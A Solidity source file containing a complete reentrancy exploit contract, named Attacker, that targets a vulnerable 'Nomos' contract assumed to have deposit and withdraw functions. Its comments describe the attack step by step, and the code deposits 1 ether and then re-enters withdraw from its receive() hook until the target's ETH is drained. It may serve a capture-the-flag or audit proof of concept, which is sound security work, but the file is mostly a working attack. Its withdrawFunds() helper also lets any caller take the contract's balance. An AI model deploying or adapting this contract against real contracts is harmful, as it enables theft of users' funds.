// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.20;

/**
 * @title IVulnerable
 * @dev Interface for the vulnerable Nomos contract.
 * Based on common reentrancy patterns, the contract is assumed to have
 * a deposit function and a withdraw function that is vulnerable.
 */
interface IVulnerable {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

/**
 * @title Attacker
 * @dev This contract exploits a reentrancy vulnerability in the Nomos contract.
 * The attack proceeds as follows:
 * 1. The attacker deposits some ETH into the vulnerable Nomos contract to establish a balance.
 * 2. The attacker calls the `attack()` function.
 * 3. The `attack()` function initiates the withdrawal process by calling `withdraw()` on the Nomos contract.
 * 4. The vulnerable Nomos contract sends ETH to the Attacker contract via a low-level call.
 * 5. This triggers the `receive()` function in the Attacker contract before the Nomos contract can update the attacker's balance.
 * 6. Inside the `receive()` function, the Attacker contract re-calls the `withdraw()` function on the Nomos contract.
 * 7. Because the balance has not yet been updated, the Nomos contract allows another withdrawal.
 * 8. This process repeats, draining the Nomos contract of its ETH.
 */
contract Attacker {

    IVulnerable public target;
    uint256 public constant DRAIN_AMOUNT = 1 ether;

    constructor(address _target) {
        target = IVulnerable(_target);
    }

    // The receive function is the reentrancy hook. It is triggered by the ETH transfer from the target.
    receive() external payable {
        // As long as the target contract has funds, re-enter the withdraw function to drain it.
        if (address(target).balance >= DRAIN_AMOUNT) {
            target.withdraw(DRAIN_AMOUNT);
        }
    }

    /**
     * @dev Initiates the attack.
     * It first deposits 1 ETH to have a balance, then calls withdraw to start the reentrancy loop.
     */
    function attack() external payable {
        // Step 1: Deposit ETH into the target contract to establish a balance.
        // This ensures we have something to withdraw.
        target.deposit{value: DRAIN_AMOUNT}();

        // Step 2: Call the vulnerable withdraw function to start the attack.
        target.withdraw(DRAIN_AMOUNT);
    }

    // Helper function to withdraw funds from this contract after the attack
    function withdrawFunds() external {
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "Failed to withdraw funds");
    }
}